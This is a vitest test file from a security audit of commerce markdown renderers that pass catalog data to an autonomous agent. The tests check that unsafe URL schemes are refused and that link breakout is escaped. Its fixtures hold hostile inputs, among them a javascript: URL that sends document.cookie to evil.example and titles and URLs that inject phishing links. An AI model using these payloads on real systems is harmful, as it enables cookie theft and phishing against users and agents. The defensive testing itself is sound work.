/**
 * Link safety in the COMMERCE renderers (security audit, Aug 2026).
 *
 * The document renderer had `isAllowedUrl` + `linkLabel` from the start; the
 * commerce renderers predated that work and interpolated titles and URLs raw.
 * That is a real primitive in any deployment where catalog rows are not
 * written by the store operator — a marketplace, a dropship feed, a supplier
 * integration — because this package's whole job is to hand those strings to
 * an autonomous agent as trusted, structured markdown.
 *
 * Two properties, asserted per renderer:
 *  1. A non-http(s) scheme never becomes a link target. The label survives as
 *     text; the scheme does not.
 *  2. A title cannot close its own link and open another. `](` and `)` in
 *     label text are escaped.
 */
import { describe, expect, it } from 'vitest'
import { renderCatalogMarkdown, renderPolicyMarkdown, renderProductMarkdown } from '../src/index'
import { catalog, pdp, policies } from './fixtures/pdp'

const JS_URL = 'javascript:fetch("//evil.example/"+document.cookie)'
/** Closes the intended link, opens an attacker-controlled one. */
const BREAKOUT_TITLE = 'Kettle](https://phish.example/pay) [Buy now'

describe('a smuggled scheme never becomes a link target', () => {
  it('product title link', () => {
    const out = renderProductMarkdown({ ...pdp, url: JS_URL })
    expect(out).not.toContain('](javascript:')
    // The substance is kept — only the link is refused.
    expect(out).toContain(pdp.title)
  })

  it('product image link', () => {
    const out = renderProductMarkdown({
      ...pdp,
      images: [{ url: JS_URL, alt: 'Front view' }],
    })
    expect(out).not.toContain('](javascript:')
    expect(out).toContain('Front view')
  })

  it('returns policy URL', () => {
    const out = renderProductMarkdown({
      ...pdp,
      returns: { summary: '60-day returns.', url: JS_URL },
    })
    expect(out).not.toContain('javascript:')
  })

  it('policy title link', () => {
    const out = renderPolicyMarkdown([{ ...policies[0]!, url: JS_URL }])
    expect(out).not.toContain('](javascript:')
    expect(out).toContain(policies[0]!.title)
  })

  it('catalog row link', () => {
    const out = renderCatalogMarkdown([{ ...catalog[0]!, url: JS_URL }])
    expect(out).not.toContain('](javascript:')
    expect(out).toContain(catalog[0]!.title)
  })

  it('data: and vbscript: are refused too', () => {
    for (const url of ['data:text/html;base64,PHNjcmlwdD4=', 'vbscript:msgbox(1)']) {
      expect(renderProductMarkdown({ ...pdp, url })).not.toContain(`](${url})`)
    }
  })

  it('ordinary https and http links still render', () => {
    const out = renderProductMarkdown(pdp)
    expect(out).toContain(`](${pdp.url})`)
  })
})

describe('the URL cannot close the link early and inject a second one', () => {
  // `https://x.example/) [click](https://evil.example` would otherwise render
  // as TWO links, the second one the attacker's, with a valid https scheme
  // that no scheme check would catch.
  const INJECTING_URL = 'https://store.example.com/) [click me](https://evil.example'

  it('product title link', () => {
    const out = renderProductMarkdown({ ...pdp, url: INJECTING_URL })
    expect(out).not.toContain('[click me](https://evil.example')
  })

  it('catalog row link', () => {
    const out = renderCatalogMarkdown([{ ...catalog[0]!, url: INJECTING_URL }])
    expect(out).not.toContain('[click me](https://evil.example')
  })

  it('a legitimate URL containing parentheses still resolves', () => {
    // Wikipedia-style URLs are real; encoding keeps them working.
    const url = 'https://store.example.com/wiki/Sock_(clothing)'
    const out = renderProductMarkdown({ ...pdp, url })
    expect(out).toContain('Sock_%28clothing%29')
  })
})

describe('link text cannot break out of its own link', () => {
  /**
   * The escaped output still CONTAINS `](…)` as a substring — preceded by a
   * backslash. What must not appear is an UNESCAPED `]` opening a link, which
   * is the thing a markdown parser would act on.
   */
  const hasLiveLinkTo = (out: string, url: string): boolean =>
    new RegExp(String.raw`(^|[^\\])\]\(${url.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}`).test(out)

  it('product title', () => {
    const out = renderProductMarkdown({ ...pdp, title: BREAKOUT_TITLE })
    expect(hasLiveLinkTo(out, 'https://phish.example/pay')).toBe(false)
    expect(out).toContain('\\]')
  })

  it('policy title', () => {
    const out = renderPolicyMarkdown([{ ...policies[0]!, title: BREAKOUT_TITLE }])
    expect(hasLiveLinkTo(out, 'https://phish.example/pay')).toBe(false)
  })

  it('catalog title, which must still escape the table pipe as well', () => {
    const out = renderCatalogMarkdown([
      { ...catalog[0]!, title: `${BREAKOUT_TITLE} | extra cell` },
    ])
    expect(hasLiveLinkTo(out, 'https://phish.example/pay')).toBe(false)
    expect(out).toContain('\\|')
  })
})
